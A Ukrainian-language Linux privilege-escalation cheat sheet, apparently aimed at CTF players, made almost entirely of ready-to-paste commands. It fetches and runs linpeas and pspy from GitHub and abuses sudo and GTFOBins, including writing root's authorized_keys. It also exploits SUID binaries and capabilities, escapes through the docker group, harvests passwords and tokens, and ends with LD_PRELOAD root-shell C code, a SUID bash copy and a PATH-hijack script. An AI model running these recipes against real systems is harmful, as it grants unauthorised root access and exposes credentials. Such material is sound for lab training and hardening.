# 1) Швидкий тріаж (1–2 хв)

```bash
whoami; id; hostnamectl; uname -a
ls -ld /root /home/*; cat /etc/os-release
ip a; ss -lntp
sudo -l
```

* Якщо `sudo -l` дає `NOPASSWD` або дозволяє запуск із збереженням env/без повного шляху — це майже фініш.

# 2) Авто-ентумерація (поки читаєш)

(Якщо є інтернет) скачай і жени:

```bash
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh
```

Паралельно — процес-спай:

```bash
curl -sL https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64 -o /tmp/pspy
chmod +x /tmp/pspy && /tmp/pspy
/tmp/pspy
```

Шукаєш root-крони/сервіси, що виконують скрипти у writable місцях.

# 3) Класика «швидких перемог»

## Sudo без пароля / з дірявими опціями

* `sudo -l` показує щось із GTFOBins?:

  * `vim`, `nano`, `less`, `find`, `tar`, `awk`, `python`, `perl`, `pip`, `ruby`, `rsync`, `nmap`, `openssl`, `tee`.
  * Приклад: `sudo /usr/bin/tee /root/.ssh/authorized_keys <<< "$(cat ~/.ssh/id_rsa.pub)"`.
  * Або `sudo vim -c ':set shell=/bin/sh | :shell'`.

* `SETENV`/`!authenticate` → `sudo -E` + `LD_PRELOAD`/`LD_LIBRARY_PATH` (якщо бінарник не скидає env).

## SUID/SGID бінарі

```bash
find / -perm -4000 -type f -printf "%m %u %p\n" 2>/dev/null
find / -perm -2000 -type f -printf "%m %u %p\n" 2>/dev/null
```

* Шукай нестандартні (не з «білих списків»), або класичні з GTFOBins.
* Якщо SUID-`bash`/`busybox`: `./bash -p`.

## Capabilities (часто ігнорять)

```bash
getcap -r / 2>/dev/null
```

* `cap_setuid+ep` на `python`, `perl`, `node`, `bash`, `openssl` = рут за хвилину.

  * Приклад: `python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'`.

## Cron/systemd таймери

* Подивись:

  ```bash
  ls -la /etc/cron*; crontab -l 2>/dev/null; ls -la /var/spool/cron/
  systemctl list-timers --all
  ```
* Якщо root запускає скрипт у директорії, де ти можеш писати → підміна/ін’єкція.
* Для systemd:

  ```bash
  systemctl | grep -i service
  systemctl cat <service>
  ```

  Writable `ExecStart` target або шлях у `$PATH` → підміна бінарника.

## PATH-hijack

* Коли `sudo` дозволяє скрипт без повного шляху:

  * Створити фейковий бінарник з тим самим ім’ям у writable-директорії, підсовуєш його через змінений `PATH`.

## Writable для root-скриптів

```bash
grep -RIl "bash|sh|python|/tmp|/var/tmp" /etc /opt /usr/local 2>/dev/null
find / -writable -type d \( -path /home -o -path /opt -o -path /var \) 2>/dev/null
```

* Часто `/opt/<app>/scripts/*.sh` виконуються root’ом — правиш/вставляєш payload.

## Docker/LXD/NFS групи

* У групах?

  ```bash
  id
  ```

  * `docker`: `docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh`
  * `lxd`: додати контейнер з `/` як пристрій.
* NFS `no_root_squash`:

  ```bash
  cat /etc/exports
  ```

  Якщо можна змонтувати — створюєш SUID-shell на рут-томі.

## Креденшли/токени/історії

```bash
grep -RIsn "password\|passwd\|secret\|token\|api_key" /home /opt /var/www /etc 2>/dev/null
ls -la /home/*/.*history; strings /var/www/* -n 10 2>/dev/null
```

* `config.php`, `.env`, `id_rsa` з слабкими правами, резервні копії `*.bak`, `*.old`.

## База/служби локально

* `ss -lntp` → що слухає на `127.0.0.1`. Якщо MySQL/Redis/Consul/Etcd без пароля — експлуатація/чтення ключів.
* Якщо веб на localhost має адмінку — тунелюй `ssh -L`.

## Kernel-експлойти (коли все інше не злетіло)

* Дивись `uname -r`, `os-release`. Якщо «зоопарк» старий і без SMEP/SMAP/ASLR жорстких — під конкретну CVE.
* Але в CTF частіше логічна/конфіг-діра, ніж kernel 0-day.

# 4) Точки спостереження (з pspy)

* Запам’ятай шляхи/імена root-процесів, що періодично сігають у скрипти. Якщо бачиш `sh /opt/.../backup.sh` → саме туди йдемо.

# 5) Мікро-рецепти (готові вставки)

**LD\_PRELOAD через sudo-able бінарник:**

```c
// /tmp/x.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { setuid(0); setgid(0); system("/bin/sh"); }
```

```bash
gcc -fPIC -shared -o /tmp/x.so /tmp/x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so <sudo-дозволений-бінарник>
```

**SUID-shell, якщо маєш запис на root-монт (NFS/docker/lxd):**

```bash
cp /bin/bash /tmp/bash && chmod u+s /tmp/bash
/tmp/bash -p
```

**PATH-hijack приклад:**

```bash
echo -e '#!/bin/sh\n/bin/sh' > /tmp/ls
chmod +x /tmp/ls
export PATH="/tmp:$PATH"
sudo /path/to/script_that_calls_ls_without_full_path
```
